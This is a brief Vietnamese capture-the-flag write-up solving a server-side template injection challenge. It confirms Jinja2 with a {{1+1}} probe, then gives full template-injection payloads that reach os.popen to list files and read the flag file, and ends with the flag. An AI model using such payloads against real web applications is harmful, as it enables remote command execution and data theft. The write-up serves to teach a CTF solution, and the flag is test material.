### url: http://61.28.237.24:30103/
![image](https://user-images.githubusercontent.com/20945393/119262390-3ed5f600-bc05-11eb-9b05-ec39dd0dcfd9.png)
### Đây là một vấn đề server side template injection
### Ta kiểm tra thử xem thế nào
url: http://61.28.237.24:30103/{{1+1}}
![image](https://user-images.githubusercontent.com/20945393/119262570-e4896500-bc05-11eb-9068-4bf60a38edee.png)
### Có thể là jinja2 chăng? Có vẻ là hiệu quả
http://61.28.237.24:30103/{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls").read()}}
![image](https://user-images.githubusercontent.com/20945393/119262641-1ac6e480-bc06-11eb-90ef-67125ecac579.png)
### Cuối cùng 
http://61.28.237.24:30103/{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat ../flag_HKOOS2lrdD").read()}}
![image](https://user-images.githubusercontent.com/20945393/119262669-39c57680-bc06-11eb-9fbe-3257e33565c3.png)
flag: HCMUS-CTF{404_teMpl4t3_1njEctIon}
